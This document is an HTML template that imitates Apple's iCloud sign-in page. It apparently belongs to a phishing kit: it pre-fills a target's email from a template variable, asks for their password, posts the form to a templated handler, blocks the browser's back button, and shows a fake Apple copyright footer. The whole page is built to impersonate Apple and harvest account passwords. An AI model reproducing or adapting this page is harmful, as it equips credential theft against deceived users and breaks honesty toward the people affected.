
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script type="text/javascript">function preventBack(){window.history.forward();}setTimeout("preventBack()", 0); window.onunload = function () { null }; </script> <script type="text/javascript" src="/static/js/jquery.min.js"></script>
<style>
body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}

.topnav {
  overflow: hidden;
  background-color: #323232;
}

.topnav a {
  float: left;
  color: #f2f2f2;
  text-align: center;
  padding: 14px 16px;
  text-decoration: none;
  font-size: 17px;
}
.awan {
    display: block;
    margin-left: auto;
    margin-right: auto;
    padding-top: 8%;
}
.topnav a:hover {
  background-color: #ddd;
  color: black;
}

.topnav a.active {
  background-color: #4CAF50;
  color: white;
}
.hadeuh {
  float:right;
  margin-top:4px;
}
.inputs {
    display: block;
    margin-left: auto;
    margin-right: auto;
    border: 1px solid #d6d6d6;
    border-radius: 7px;
    background-color: #fff;
    position: relative;
    width: 328px;
    height: 40px;
    font-size: 17px;
    line-height: 1.29412;
    font-weight: 400;
    letter-spacing: -.021em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    box-sizing: border-box;
    padding-left: 15px;
    vertical-align: top;
}
.inputs:focus {
  border: 1px solid #0070c9;   
}
input[type=text] {
  box-sizing: border-box;
  border: 1px solid #ccc;
  -webkit-transition: 0.5s;
  transition: 0.5s;
  outline: none;
}

input[type=text]:focus {
  border: 1px solid #0070c9;
}
p {
    color: #494949;
    text-align: center;
    font-size: 21px;
    line-height: 1.38105;
    font-weight: 400;
    letter-spacing: .011em;
    font-family: SF Pro Display,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    
}
.checkbox{
    margin-left: auto;
    margin-right: auto;
    margin-top: 10%;
    
}
.loanjing{
    display: block;
    margin-left: auto;
    margin-right: auto;
    position: relative;
    width: 328px;
    height: 40px;
    font-size: 17px;
    line-height: 1.29412;
    font-weight: 400;
    letter-spacing: -.021em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    box-sizing: border-box;
    padding-left: 90px;
    margin-top: 3%;
    vertical-align: top;
}
.balmond{
    display: block;
    margin-left: auto;
    margin-right: auto;
    border: 1px solid #2e81d6;
    background: #2e81d6;
    border-radius: 50px;
    position: relative;
    width: 328px;
    height: 40px;
    font-size: 17px;
    line-height: 1.29412;
    font-weight: 400;
    letter-spacing: -.021em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    box-sizing: border-box;
    padding-left: 15px;
    vertical-align: top;
    margin-top: 10px;
    color: white;
}
.legal-footer{
     position: fixed;
    left: 0;
    bottom: 0;
    width: 100%;
    text-align: center;
    color: rgb(0 0 0 / 32%);
    font-family: SFUIText,Helvetica Neue,sans-serif;
    font-size: 11px;
    font-weight: 400;
    margin-bottom: 10px;
}
</style>
<link rel="preload" as="font" href="assets/email-assets/fonts/SFUIText-Light.woff" type="font/woff" crossorigin="true">
<link rel="preload" as="font" href="assets/email-assets/fonts/SFUIDisplay-Regular.woff" type="font/woff" crossorigin="true">
<link rel="preload" as="font" href="assets/email-assets/fonts/SFUIDisplay-Semibold.woff" type="font/woff" crossorigin="true">
<link rel="preload" as="font" href="assets/email-assets/fonts/SFUIText-Light.woff" type="font/woff" crossorigin="true">
<link rel="preload" as="font" href="assets/email-assets/fonts/SFUIText-Medium.woff" type="font/woff" crossorigin="true">
<link rel="preload" as="font" href="assets/email-assets/fonts/SFUIText-Regular.woff" type="font/woff" crossorigin="true">
</head>
<body>
<form method="post" action="@form_action_page('email')">
<div class="topnav">
    <img src="assets/email-assets/cloud.png" width="20px" style="margin-top: 10px;margin-left: 10px;margin-bottom: 10px;">
    <img class="hadeuh" src="assets/email-assets/logo.png" height="35px">
    
</div>
   
<div class="wrapperr">

                <img class="awan" src="assets/email-assets/icloud_drive_icon.png" srcset="" role="presentation" style="width: 100px;">
        </div><p>Sign in to iCloud</p>
        <input type="text" class="inputs formtext" id="email" name="email" value="{{ $email }}" readonly style="
    background-color: #e0e0e0;
">
        <input type="password" class="inputs formtext" id="password" name="password" placeholder="Password" style="margin-top:10px" required>
<button class="balmond">Submit</button>
</div>
<div class="loanjing">
    <input type="checkbox" id="remember-me" class="checkbox">
    <label id="remember-me-label" class="form-label" for="remember-me"> <span class="form-choice-indicator"></span>                    Keep me signed in
                 
                  </label>
                  </form>
    <div class="legal-footer" ><div class="legal-footer-content">
                        <span><a class="create" target="_blank">Create Apple ID</a>  |  <a class="sytemStatus">System Status</a> |  <a class="privacy">Privacy & Policy  |  </a><a class="terms" target="_blank">Terms &amp; Conditions</a>  |  <span class="copyright">Copyright © 2020 Apple Inc. All rights reserved.</span></span>
                    </div></div>
    
</div>

</body>
</html>
